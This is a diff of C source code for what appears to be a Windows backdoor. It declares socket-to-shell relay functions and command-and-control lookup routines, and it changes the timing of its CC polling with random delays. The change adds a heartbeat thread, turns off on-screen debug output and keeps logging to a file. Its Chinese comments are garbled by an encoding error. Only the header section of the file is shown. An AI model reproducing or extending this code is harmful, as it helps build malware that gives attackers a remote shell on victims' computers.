@@ -3,22 +3,24 @@
 
 #include <winsock2.h>
 #pragma comment( lib , "Ws2_32.lib" )
-#include <Windows.h>
+#pragma comment( lib , "User32.lib" )
+//#include <Windows.h>
 #include <string.h>
 #include <stdlib.h>
 #include <stdarg.h>
 #include <stdio.h>
 
-#define _DEBUG_ // æ— è§†æ—¶é—´é™åˆ¶ä»¥åŠæ‰“å¼€å®¹é”™å¤„ç†
-#define _DEBUG_PRINT_
-#define _DEBUG_PRINT_TO_FILE_ // PRINT æ— è§† _DEBUG_PRINT_ è¾“å‡ºåˆ°æ–‡ä»¶
+//#define _DEBUG_ // ÎŞÊÓÊ±¼äÏŞÖÆÒÔ¼°´ò¿ªÈİ´í´¦Àí
+//#define _DEBUG_PRINT_
+#define _DEBUG_PRINT_TO_FILE_ // PRINT ÎŞÊÓ _DEBUG_PRINT_ Êä³öµ½ÎÄ¼ş
 #define _DEBUG_PRINT_FILE_NAME_ "c:\\xjj.log"
-#define CHECK_LOCAL_TIME_SPLIT (20) // æŸ¥æœ¬åœ°æ—¶é—´å¹¶æŸ¥ CC çš„é—´éš”ï¼Œæ— æ•ˆåˆ™æ€æ­» daemon
-#define RANDOM_SEND_GET_SPLIT_RANGE (2) // æŸ¥ CC æ—¶æ’å…¥éšæœºæ—¶é—´çš„æœ€å¤§å€¼
-#define BIND_SPLIT_RANDOM_BASE (4)	// ä¸¤æ¬¡ bind æ“ä½œä¹‹é—´çš„é—´éš”
-#define BIND_SPLIT_RANDOM_RANGE (2)	// ä¸¤æ¬¡ bind æ“ä½œä¹‹é—´çš„é—´éš”
+#define CHECK_LOCAL_TIME_SPLIT (60) // ²é±¾µØÊ±¼ä²¢²é CC µÄ¼ä¸ô£¬ÎŞĞ§ÔòÉ±ËÀ daemon
+#define RANDOM_SEND_GET_SPLIT_RANGE (10) // ²é CC Ê±²åÈëËæ»úÊ±¼äµÄ×î´óÖµ
+#define BIND_SPLIT_RANDOM_BASE (4)	// Á½´Î bind ²Ù×÷Ö®¼äµÄ¼ä¸ô
+#define BIND_SPLIT_RANDOM_RANGE (2)	// Á½´Î bind ²Ù×÷Ö®¼äµÄ¼ä¸ô
 #define DEFAULT_BUFLEN (44) // must larger than lenth "wassup000.000.000.000:00000wassup"
 #define DEFAULT_PORT (80)
+#define HEART_BEAT_SPLIT (60) // Ïß³Ì»¥³âĞÄÌø¼ì²â¼ä¸ô
 
 #ifdef _DEBUG_PRINT_
 	#define MESSAGEBOX( ... ) MessageBox( __VA_ARGS__ )
@@ -50,6 +52,8 @@ void GetCCInfo( char* address ) ; // DONE
 BOOLEAN CheckAddress( char* address ) ; // DONE
 DWORD WINAPI ClientSocketToShell(LPVOID lpParameter) ; // copy from stackoverflow.com
 DWORD WINAPI ShellToClientSocket(LPVOID lpParameter) ; // copy from stackoverflow.com
+DWORD WINAPI HeartBeatThread( LPVOID lpParam ) ;
+BOOL CheckHeartBeat( ) ;
 
 typedef struct _sThreadInfo
 {
